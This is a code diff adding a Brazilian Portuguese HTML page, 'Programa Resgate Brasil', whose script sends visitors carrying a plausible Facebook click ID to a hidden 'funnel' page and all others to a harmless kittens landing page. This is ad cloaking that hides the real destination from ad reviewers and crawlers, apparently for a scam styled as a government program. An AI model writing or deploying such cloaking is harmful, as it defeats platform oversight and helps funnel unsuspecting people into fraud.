@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>Programa Resgate Brasil</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{background:#204F9F;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;color:#fff}
+  .box{text-align:center;padding:30px}
+  .spin{width:44px;height:44px;border:4px solid rgba(255,255,255,.3);border-top-color:#FF8C00;border-radius:50%;margin:0 auto 16px;animation:g 1s linear infinite}
+  @keyframes g{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="spin"></div>
+  <div id="msg">Carregando...</div>
+</div>
+<script>
+(function(){
+  "use strict";
+
+  /* ============ DESTINOS ============ */
+  var DEST_OK  = "/protocolo/registro/consulta.html";  /* veio do anuncio -> funil */
+  var DEST_ERR = "/";          /* qualquer outro  -> landing (gatinhos) */
+
+  function irPara(destino){
+    try { window.location.replace(destino); }
+    catch(e){ window.location.href = destino; }
+  }
+
+  /* ============ VALIDACAO ROBUSTA DO fbclid ============ */
+  function fbclidValido(v){
+    if (!v || typeof v !== "string") return false;
+
+    /* 1) tamanho: cliques reais costumam ter 50-200 chars */
+    if (v.length < 40 || v.length > 250) return false;
+
+    /* 2) charset: base64url (A-Z a-z 0-9 - _) */
+    if (!/^[A-Za-z0-9_-]+$/.test(v)) return false;
+
+    /* 3) prefixo conhecido do Facebook (Iw + variacoes) */
+    if (!/^Iw[A-Za-z0-9_-]/.test(v)) return false;
+
+    /* 4) precisa ter variedade (nao pode ser "IwAAAAAAAA...") */
+    var unicos = {};
+    for (var i = 0; i < v.length; i++){ unicos[v[i]] = 1; }
+    if (Object.keys(unicos).length < 12) return false;
+
+    /* 5) nao pode ser sequencia obvia */
+    if (/^(.)\1+$/.test(v)) return false;
+
+    return true;
+  }
+
+  /* aceita tambem igshid (Instagram) e gclid (Google) se quiser */
+  var ACEITAR_IG = false;
+  var ACEITAR_GOOGLE = false;
+
+  var p = new URLSearchParams(window.location.search);
+  var fbclid = p.get("fbclid");
+
+  if (fbclidValido(fbclid)){
+    irPara(DEST_OK);
+    return;
+  }
+
+  if (ACEITAR_IG && fbclidValido(p.get("igshid"))){
+    irPara(DEST_OK);
+    return;
+  }
+
+  if (ACEITAR_GOOGLE && fbclidValido(p.get("gclid"))){
+    irPara(DEST_OK);
+    return;
+  }
+
+  /* sem clique valido -> landing */
+  irPara(DEST_ERR);
+})();
+</script>
+</body>
+</html>
